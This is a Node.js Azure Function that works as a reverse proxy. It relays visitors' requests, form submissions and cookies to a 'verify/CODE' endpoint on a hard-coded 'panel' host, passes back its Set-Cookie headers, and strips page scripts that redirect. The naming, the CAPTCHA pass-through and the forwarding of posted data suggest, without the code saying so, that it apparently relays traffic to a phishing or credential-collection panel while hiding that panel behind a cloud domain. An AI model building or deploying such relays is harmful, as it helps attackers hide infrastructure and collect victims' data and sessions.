const crypto = require('crypto');
const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    
    path = path.replace(/^\/api\/proxy/, '');
    if (!path.startsWith('/')) path = '/' + path;

    const parts = path.split('/').filter(Boolean);
    let code = '';
    
    // Try to grab the code from the URL (e.g. /random/CODE)
    if (parts.length >= 2 && parts[1].length > 4) {
        code = parts[1];
    } else if (parts.length === 1 && parts[0].length > 4 && parts[0] !== 'verify') {
        code = parts[0];
    }

    // If it's a POST from the form (submitting to root), we need the code from the form body
    if (req.method === 'POST' && !code && req.body) {
        // If they submitted to the root, the body has the code (or we check the Referer URL)
        const referer = req.headers['referer'] || '';
        const refParts = referer.split('/').filter(Boolean);
        if (refParts.length > 0) code = refParts[refParts.length - 1];
    }

    if (!code) {
        // If we still don't have a code, we can't proceed
        context.res = { status: 400, body: "Missing code." };
        return;
    }

    // 1. Define the target URL
    let targetPath = `/verify/${code}`;
    
    // 2. If it's a POST, we forward the POST to /verify/CODE to trigger the CAPTCHA pass
    // If it's a GET, we fetch the page (either the CAPTCHA or the final template)
    let currentUrl = `https://${PANEL}${targetPath}`;
    
    if (req.query && Object.keys(req.query).length > 0) {
        currentUrl += '?' + new URLSearchParams(req.query).toString();
    }

    context.log(`Forwarding ${req.method} to: ${currentUrl}`);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        let r;

        // 3. Follow server-side redirects
        for (let hop = 0; hop < 5; hop++) {
            r = await fetch(currentUrl, {
                method: req.method,
                headers: forwardHeaders,
                body: body,
                redirect: 'manual'
            });

            const loc = r.headers.get('location');
            if (r.status >= 300 && r.status < 400 && loc) {
                let finalUrl = new URL(loc, currentUrl).toString();
                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
                currentUrl = finalUrl;
                continue;
            }
            break;
        }

        let responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        // 4. Clean up the HTML
        if (contentType.includes('text/html')) {
            responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                    return ''; 
                }
                return match;
            });
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        };
        
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        context.res = { status: 200, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
